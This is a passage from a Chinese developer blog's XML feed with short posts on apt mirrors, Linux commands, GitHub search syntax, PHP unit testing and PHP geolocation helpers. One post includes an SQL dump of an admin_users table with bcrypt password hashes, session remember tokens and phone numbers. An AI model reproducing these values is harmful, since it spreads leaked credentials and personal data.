    <content><![CDATA[<p>把原来的<code>/etc/apt/sources.list</code>注释了，把下面的阿里云源加入<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"> deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>homestead</tag>
      </tags>
  </entry>
  <entry>
    <title>【linux】linux笔记-常识常用命令小抄</title>
    <url>/2019/11/18/%E3%80%90linux%E3%80%91linux%E7%AC%94%E8%AE%B0-%E5%B8%B8%E8%AF%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%B0%8F%E6%8A%84/</url>
    <content><![CDATA[<h4 id="解压tar-zx文件"><a href="#解压tar-zx文件" class="headerlink" title="解压tar.zx文件"></a>解压<code>tar.zx</code>文件</h4><p> 首先要先安装<code>tar</code>工具，然后:<br><code>tar -xvf filename.tar.xz</code></p>
<h4 id="开启和关闭网卡"><a href="#开启和关闭网卡" class="headerlink" title="开启和关闭网卡"></a>开启和关闭网卡</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">ifdown &lt;网卡名&gt;</span><br><span class="line">ifup &lt;网卡名&gt;</span><br></pre></td></tr></table></figure></div>
<h4 id="查看文件和目录大小"><a href="#查看文件和目录大小" class="headerlink" title="查看文件和目录大小"></a>查看文件和目录大小</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">du -h --max-depth=&lt;level&gt; &lt;path&gt;</span><br></pre></td></tr></table></figure></div>]]></content>
  </entry>
  <entry>
    <title>【github】使用github的小技巧</title>
    <url>/2019/11/15/%E3%80%90github%E3%80%91%E4%BD%BF%E7%94%A8github%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h3 id="一搜索栏搜索语法"><a href="#一搜索栏搜索语法" class="headerlink" title="一搜索栏搜索语法"></a>一搜索栏搜索语法</h3><table>
<thead>
<tr>
<th style="text-align:center">关键词</th>
<th style="text-align:left">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>language</code></td>
<td style="text-align:left"><code>language:php</code> 搜索的目标是用<code>php</code></td>
</tr>
<tr>
<td style="text-align:center"><code>stars</code></td>
<td style="text-align:left"><code>stars:&gt;10000</code>查找的项目星星要大于10000</td>
</tr>
<tr>
<td style="text-align:center"><code>pushed</code></td>
<td style="text-align:left"><code>pushed:&gt;2019-10-10</code> 查找的项目最后推送时间要大于2019-10-10</td>
</tr>
<tr>
<td style="text-align:center"><code>in:name</code></td>
<td style="text-align:left"><code>in:name laravel</code> 项目的名称含有<code>laravel</code>这个词</td>
</tr>
<tr>
<td style="text-align:center"><code>in:readme</code></td>
<td style="text-align:left"><code>in:readme  framework</code> 项目的<code>README.md</code>文件要有<code>framework</code>这个词</td>
</tr>
<tr>
<td style="text-align:center"><code>in:description</code></td>
<td style="text-align:left"><code>in:description web</code>项目描述含有<code>web</code>这个词</td>
</tr>
</tbody>
</table>
<p>合起来就是<code>language:php stars:&gt;10000 pushed:&gt;2019-10-10 in:name laravel in:readme  framework in:description web</code> ，然后回车搜索。<br>更多的语法参考<span class="exturl" data-url="aHR0cHM6Ly9oZWxwLmdpdGh1Yi5jb20vZW4vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3VuZGVyc3RhbmRpbmctdGhlLXNlYXJjaC1zeW50YXg=" title="https://help.github.com/en/github/searching-for-information-on-github/understanding-the-search-syntax">官方文档<i class="fa fa-external-link"></i></span><br><a id="more"></a></p>
<h3 id="结果排序"><a href="#结果排序" class="headerlink" title="结果排序"></a>结果排序</h3><table>
<thead>
<tr>
<th style="text-align:center">关键词</th>
<th style="text-align:left">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>sort:stars-desc</code></td>
<td style="text-align:left">按星星从大到小排序</td>
</tr>
</tbody>
</table>
<p>更多的排序语法参考<span class="exturl" data-url="aHR0cHM6Ly9oZWxwLmdpdGh1Yi5jb20vZW4vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NvcnRpbmctc2VhcmNoLXJlc3VsdHM=" title="https://help.github.com/en/github/searching-for-information-on-github/sorting-search-results">官方文档<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>【CI/CD】php单元测试入门篇(一)-单元测试初探.</title>
    <url>/2019/11/09/%E3%80%90CICD%E3%80%91php%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%E7%AF%87(%E4%B8%80)-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="什么是单元测试？"><a href="#什么是单元测试？" class="headerlink" title="什么是单元测试？"></a>什么是单元测试？</h4><p>&emsp;处理一件事流程越长, 码量就越多。如类的默认参数，如何确定运行时就是预期的参数。 如验证流程代码， 如何确定在错误流程面能验证出来,甚至进入异常流程？又如方法调用，又如何能确定调用后就是期待的数据？所以单元测试就是测试编写的代码是否按照自己的设想在代码里正常运行下去。<br><a id="more"></a></p>
]]></content>
      <categories>
        <category>CI/CD</category>
      </categories>
      <tags>
        <tag>CI/CD</tag>
        <tag>php单元测试</tag>
        <tag>单元测试</tag>
      </tags>
  </entry>
  <entry>
    <title>【PHP】PHP笔记-函数摘要</title>
    <url>/2019/10/28/%E3%80%90PHP%E3%80%91PHP%E7%AC%94%E8%AE%B0-%E5%87%BD%E6%95%B0%E6%91%98%E8%A6%81/</url>
    <content><![CDATA[<h4 id="1-json-decode-格式化输出"><a href="#1-json-decode-格式化输出" class="headerlink" title="1 json__decode() 格式化输出"></a>1 json__decode() 格式化输出</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">json = <span class="string">'"&#123;"status":"1","count":"1","info":"OK","infocode":"10000","lives":[&#123;"province":"\u5e7f\u4e1c","city":"\u6df1\u5733\u5e02","adcode":"440300","weather":"\u6674","temperature":"20","winddire                                                                                                 ction":"\u897f\u5317","windpower":"\u22643","humidity":"74","reporttime":"2019-10-28 23:15:45&#125;]&#125;"'</span>;</span></span><br><span class="line"><span class="meta">json_encode($</span><span class="bash">json, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);</span></span><br></pre></td></tr></table></figure></div>
<div class="note info">
            <p>加了参数<code>JSON_PRETTY_PRINT</code>和<code>JSON_UNESCAPED_UNICODE</code>后会格式化，在命令行打印就没那么乱了</p>
          </div>
<a id="more"></a>
<h4 id="计算坐标距离"><a href="#计算坐标距离" class="headerlink" title="计算坐标距离"></a>计算坐标距离</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 计算两点地理坐标之间的距离</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Decimal $longitude1 起点经度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Decimal $latitude1  起点纬度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Decimal $longitude2 终点经度 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Decimal $latitude2  终点纬度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Int     $unit       单位 1:米 2:公里</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  Int     $decimal    精度 保留小数位数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Decimal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDistance</span><span class="params">($longitude1, $latitude1, $longitude2, $latitude2, $unit=<span class="number">2</span>, $decimal=<span class="number">2</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $EARTH_RADIUS = <span class="number">6370.996</span>; <span class="comment">// 地球半径系数</span></span><br><span class="line">    $PI = <span class="number">3.1415926</span>;</span><br><span class="line"></span><br><span class="line">    $radLat1 = $latitude1 * $PI / <span class="number">180.0</span>;</span><br><span class="line">    $radLat2 = $latitude2 * $PI / <span class="number">180.0</span>;</span><br><span class="line"></span><br><span class="line">    $radLng1 = $longitude1 * $PI / <span class="number">180.0</span>;</span><br><span class="line">    $radLng2 = $longitude2 * $PI /<span class="number">180.0</span>;</span><br><span class="line"></span><br><span class="line">    $a = $radLat1 - $radLat2;</span><br><span class="line">    $b = $radLng1 - $radLng2;</span><br><span class="line"></span><br><span class="line">    $distance = <span class="number">2</span> * asin(sqrt(pow(sin($a/<span class="number">2</span>),<span class="number">2</span>) + cos($radLat1) * cos($radLat2) * pow(sin($b/<span class="number">2</span>),<span class="number">2</span>)));</span><br><span class="line">    $distance = $distance * $EARTH_RADIUS * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($unit==<span class="number">2</span>)&#123;</span><br><span class="line">        $distance = $distance / <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> round($distance, $decimal);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>注： <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZkaXB6b25lL2FydGljbGUvZGV0YWlscy80NzE2MjU2Mw==" title="https://blog.csdn.net/fdipzone/article/details/47162563">摘录自<i class="fa fa-external-link"></i></span></li>
</ul>
<h4 id="计算坐标附近坐标"><a href="#计算坐标附近坐标" class="headerlink" title="计算坐标附近坐标"></a>计算坐标附近坐标</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注： 使用的是laravel 的DB数据库驱动</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">DB</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *计算某个经纬度的周围某段距离的正方形的四个点</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@param</span> lng float 经度</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@param</span> lat float 纬度</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@param</span> distance float 该点所在圆的半径，该圆与此正方形内切，默认值为0.5千米</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@return</span> array 正方形的四个点的经纬度坐标</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_square_point</span><span class="params">($lng, $lat,$distance = <span class="number">0.5</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $earth_radius =  <span class="number">6371</span>;<span class="comment">//地球半径，平均半径为6371km</span></span><br><span class="line">    $dlng =  <span class="number">2</span> * asin(sin($distance / (<span class="number">2</span> * $earth_radius)) / cos(deg2rad($lat)));</span><br><span class="line">    $dlng = rad2deg($dlng);</span><br><span class="line">    $dlat = $distance/$earth_radius;</span><br><span class="line">    $dlat = rad2deg($dlat);</span><br><span class="line">    $squares= <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'left-top'</span>     =&gt; <span class="keyword">array</span>(<span class="string">'latitude'</span>=&gt;$lat + $dlat, <span class="string">'longitude'</span>=&gt;$lng-$dlng),</span><br><span class="line">        <span class="string">'right-top'</span>    =&gt; <span class="keyword">array</span>(<span class="string">'latitude'</span>=&gt;$lat + $dlat, <span class="string">'longitude'</span>=&gt;$lng + $dlng),</span><br><span class="line">        <span class="string">'left-bottom'</span>  =&gt; <span class="keyword">array</span>(<span class="string">'latitude'</span>=&gt;$lat - $dlat, <span class="string">'longitude'</span>=&gt;$lng - $dlng),</span><br><span class="line">        <span class="string">'right-bottom'</span> =&gt; <span class="keyword">array</span>(<span class="string">'latitude'</span>=&gt;$lat - $dlat, <span class="string">'longitude'</span>=&gt;$lng + $dlng)</span><br><span class="line">    );</span><br><span class="line">    $info_sql = <span class="string">"</span></span><br><span class="line"><span class="string">        select</span></span><br><span class="line"><span class="string">        *</span></span><br><span class="line"><span class="string">        from</span></span><br><span class="line"><span class="string">        `admin_users`</span></span><br><span class="line"><span class="string">        where</span></span><br><span class="line"><span class="string">        latitude&lt;&gt;0</span></span><br><span class="line"><span class="string">        and</span></span><br><span class="line"><span class="string">        latitude&gt;&#123;$squares['right-bottom']['latitude']&#125;</span></span><br><span class="line"><span class="string">        and</span></span><br><span class="line"><span class="string">        latitude&lt;&#123;$squares['left-top']['latitude']&#125;</span></span><br><span class="line"><span class="string">        and</span></span><br><span class="line"><span class="string">        longitude&gt;&#123;$squares['left-top']['longitude']&#125;</span></span><br><span class="line"><span class="string">        and</span></span><br><span class="line"><span class="string">        longitude&lt;&#123;$squares['right-bottom']['longitude']&#125;</span></span><br><span class="line"><span class="string">        "</span>;</span><br><span class="line">    $locations = DB::select($info_sql);</span><br><span class="line">    <span class="keyword">return</span> $locations;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"><span class="comment">##### sql 数据</span></span><br><span class="line">``` SQL</span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> admin_users</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE <span class="keyword">IF</span> EXISTS `admin_users`;</span><br><span class="line">CREATE TABLE `admin_users`  (</span><br><span class="line">  `id` int(<span class="number">10</span>) UNSIGNED NOT <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(<span class="number">190</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT <span class="keyword">NULL</span>,</span><br><span class="line">  `password` varchar(<span class="number">60</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT <span class="keyword">NULL</span>,</span><br><span class="line">  `name` varchar(<span class="number">191</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT <span class="keyword">NULL</span>,</span><br><span class="line">  `avatar` varchar(<span class="number">191</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `remember_token` varchar(<span class="number">100</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `created_at` timestamp(<span class="number">0</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `updated_at` timestamp(<span class="number">0</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `province_id` int(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'省id'</span>,</span><br><span class="line">  `city_id` int(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'市id'</span>,</span><br><span class="line">  `district_id` int(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'区id'</span>,</span><br><span class="line">  `address` varchar(<span class="number">255</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'地址'</span>,</span><br><span class="line">  `phone` char(<span class="number">11</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'手机'</span>,</span><br><span class="line">  `address_tag_ids` varchar(<span class="number">200</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'地址标签组'</span>,</span><br><span class="line">  `longitude` float <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'经度'</span>,</span><br><span class="line">  `latitude` float <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'纬度'</span>,</span><br><span class="line">  `rate` float <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> COMMENT <span class="string">'评分'</span>,</span><br><span class="line">  `thumbs` varchar(<span class="number">255</span>) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">'默认图片'</span>,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE,</span><br><span class="line">  UNIQUE INDEX `admin_users_username_unique`(`username`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = <span class="number">35</span> CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Compact;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of admin_users</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">1</span>, <span class="string">'admin'</span>, <span class="string">'$2y$10$mCD6sALAyA1n1TA1kmHPde4q.HyBIxP6s.hyixuUn5pEcAOq8PNly'</span>, <span class="string">'Administrator'</span>, <span class="keyword">NULL</span>, <span class="string">'ARHYDKYuNtYo6YPux1w8XK7Ewnr1SnmKOppn8RKv9OqTrpsVFpN2Fvq8dSd5'</span>, <span class="string">'2019-11-17 17:43:24'</span>, <span class="string">'2019-11-17 17:43:24'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">2</span>, <span class="string">'test_store_1'</span>, <span class="string">'$2y$10$ymeySpuUSuA9Sw6m5LJu/eUwi5OS/pUAYLsfxNRG24yDh2bHm1jUm'</span>, <span class="string">'测试门店11'</span>, <span class="keyword">NULL</span>, <span class="string">'Q22MIny2R4OkCi1NJdlcxIcBjhbO1pELUvjWUr9GS1uU5md2VvNxlj6epnbu'</span>, <span class="string">'2019-11-19 03:12:16'</span>, <span class="string">'2019-11-30 08:32:54'</span>, <span class="number">440000</span>, <span class="number">440100</span>, <span class="number">440113</span>, <span class="string">'修改为广州的地址'</span>, <span class="string">'13427969604'</span>, <span class="string">'1'</span>, <span class="number">113.27</span>, <span class="number">22.9884</span>, <span class="number">1</span>, <span class="string">'[\"images\\/5459830341e51c0f9ffafbde26aa92e7.png\",\"images\\/dbbb7afd9541413b858b37bc1f58d456.png\",\"images\\/14.jpg\"]'</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">28</span>, <span class="string">'address_atg_ids'</span>, <span class="string">'$2y$10$IZUGkGor7p4NsK58oaRknuOqjClTWOHKHo4NKsInerGXM14Xsy8KS'</span>, <span class="string">'测试门店21'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="string">'2019-11-26 08:57:18'</span>, <span class="string">'2019-11-29 21:07:55'</span>, <span class="number">440000</span>, <span class="number">445200</span>, <span class="number">445224</span>, <span class="string">'测试门店2的地址'</span>, <span class="string">'13427969604'</span>, <span class="string">'1'</span>, <span class="number">116.295</span>, <span class="number">23.0232</span>, <span class="number">2</span>, <span class="string">'[\"images\\/5459830341e51c0f9ffafbde26aa92e7.png\",\"images\\/dbbb7afd9541413b858b37bc1f58d456.png\",\"images\\/14.jpg\"]'</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">29</span>, <span class="string">'test_store_3'</span>, <span class="string">'$2y$10$yVygcYHu443y1JSipdDXcenTXksGga9b4edZPrcrOuD3F0NUBeC3S'</span>, <span class="string">'测试门店3'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="string">'2019-11-29 18:39:26'</span>, <span class="string">'2019-11-29 20:56:52'</span>, <span class="number">440000</span>, <span class="number">441300</span>, <span class="number">441303</span>, <span class="string">'测试门店3的地址'</span>, <span class="string">'13427969604'</span>, <span class="string">'2'</span>, <span class="number">114.455</span>, <span class="number">22.783</span>, <span class="number">4</span>, <span class="string">'[\"images\\/cefb1285dc1ec23b9c62936795c27dc7.jpg\",\"images\\/f1de376cdb5338c9f0ea6306cbdcf5c2.jpg\",\"images\\/4193b3654284031c0e13db01633098da.jpg\"]'</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">30</span>, <span class="string">'test_store_5'</span>, <span class="string">'$2y$10$GGwmtj.ZzsAh8JcgZXS.xe0OEy.EkU7DymNc9hRjuRPTMrFwZSDCm'</span>, <span class="string">'测试门店5'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="string">'2019-12-04 15:55:29'</span>, <span class="string">'2019-12-04 15:55:29'</span>, <span class="number">440000</span>, <span class="number">441300</span>, <span class="number">441323</span>, <span class="string">'测试门店5的地址是在惠东县那边的'</span>, <span class="string">'13427969600'</span>, <span class="string">'1'</span>, <span class="number">114.72</span>, <span class="number">22.985</span>, <span class="number">5</span>, <span class="string">'[\"images\\/5459830341e51c0f9ffafbde26aa92e7.png\",\"images\\/dbbb7afd9541413b858b37bc1f58d456.png\",\"images\\/14.jpg\"]'</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">31</span>, <span class="string">'test_store_6'</span>, <span class="string">'$2y$10$K2gWPsa8wk36wl8ybcHx0OpbR6n8pvdGPLE5.lasMrz7ODRcfJd7a'</span>, <span class="string">'惠东县测试门店6'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="string">'2019-12-04 15:57:25'</span>, <span class="string">'2019-12-04 15:57:25'</span>, <span class="number">440000</span>, <span class="number">441300</span>, <span class="number">441323</span>, <span class="string">'惠东县测试门店6的地址哈'</span>, <span class="string">'13427969600'</span>, <span class="string">'2'</span>, <span class="number">114.72</span>, <span class="number">22.9718</span>, <span class="number">4</span>, <span class="string">'[\"images\\/5459830341e51c0f9ffafbde26aa92e7.png\",\"images\\/dbbb7afd9541413b858b37bc1f58d456.png\",\"images\\/14.jpg\"]'</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">32</span>, <span class="string">'test_store_7'</span>, <span class="string">'$2y$10$g2yZhgf9KtV0MnPJbOWbIue9/EmABzXJKmcd/eeDYvQxtA9h2CwZu'</span>, <span class="string">'测试门店7'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="string">'2019-12-05 09:54:46'</span>, <span class="string">'2019-12-05 09:54:46'</span>, <span class="number">440000</span>, <span class="number">441300</span>, <span class="number">441303</span>, <span class="string">'皇家公馆（测试地址第一近）'</span>, <span class="string">'13427969604'</span>, <span class="string">'2'</span>, <span class="number">114.456</span>, <span class="number">22.7834</span>, <span class="number">5</span>, <span class="string">'[\"images\\/5459830341e51c0f9ffafbde26aa92e7.png\",\"images\\/dbbb7afd9541413b858b37bc1f58d456.png\",\"images\\/14.jpg\"]'</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">33</span>, <span class="string">'test_store_8'</span>, <span class="string">'$2y$10$4zCp3eYVI5EpoCa89AbyEu90ES7aLjiFOJNm/iUZd.MTINFM2wxsi'</span>, <span class="string">'测试门店8'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="string">'2019-12-05 09:55:49'</span>, <span class="string">'2019-12-05 09:55:49'</span>, <span class="number">440000</span>, <span class="number">441300</span>, <span class="number">441303</span>, <span class="string">'测试地址第二近'</span>, <span class="string">'13427969604'</span>, <span class="string">'1'</span>, <span class="number">114.456</span>, <span class="number">22.7832</span>, <span class="number">4</span>, <span class="string">'[\"images\\/5459830341e51c0f9ffafbde26aa92e7.png\",\"images\\/dbbb7afd9541413b858b37bc1f58d456.png\",\"images\\/14.jpg\"]'</span>);</span><br><span class="line">INSERT INTO `admin_users` VALUES (<span class="number">34</span>, <span class="string">'test_store_9'</span>, <span class="string">'$2y$10$3lWrP8K/mTNtso03V.ef0.unebThRU1.gToQkO/hMIeftPbZlCMNi'</span>, <span class="string">'测试门店9'</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="string">'2019-12-05 09:56:39'</span>, <span class="string">'2019-12-05 09:56:39'</span>, <span class="number">440000</span>, <span class="number">441300</span>, <span class="number">441303</span>, <span class="string">'测试地址第3近'</span>, <span class="string">'13427969600'</span>, <span class="string">'2'</span>, <span class="number">114.457</span>, <span class="number">22.7836</span>, <span class="number">4</span>, <span class="string">'[\"images\\/5459830341e51c0f9ffafbde26aa92e7.png\",\"images\\/dbbb7afd9541413b858b37bc1f58d456.png\",\"images\\/14.jpg\"]'</span>);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<p><code>`</code></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>【nodejs】七牛云视频瘦身demo</title>
    <url>/2019/10/25/%E3%80%90nodejs%E3%80%91%E4%B8%83%E7%89%9B%E4%BA%91%E8%A7%86%E9%A2%91%E7%98%A6%E8%BA%ABdemo/</url>
    <content><![CDATA[<div class="note info">
            <p>本<code>demo</code> 参考<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIucWluaXUuY29tL2RvcmEvYXBpLzYwOTcvcGVyY2VwdGl2ZS10cmFuc2NvZGluZy1hdnNtYXJ0LTE=" title="https://developer.qiniu.com/dora/api/6097/perceptive-transcoding-avsmart-1">视频转码文档<i class="fa fa-external-link"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Fpbml1L25vZGVqcy1zZGsvYmxvYi9tYXN0ZXIvZXhhbXBsZXMvZm9ybV91cGxvYWRfc2ltcGxlLmpz" title="https://github.com/qiniu/nodejs-sdk/blob/master/examples/form_upload_simple.js">官方demo<i class="fa fa-external-link"></i></span>和 <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIucWluaXUuY29tL2RvcmEvYXBpLzM2ODUvZGlyZWN0aW9ucy1mb3ItdXNlLWF2" title="https://developer.qiniu.com/dora/api/3685/directions-for-use-av">转码说明文档<i class="fa fa-external-link"></i></span>写出来的.</p>
          </div>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><h4 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a><code>index.js</code></h4><a id="more"></a>
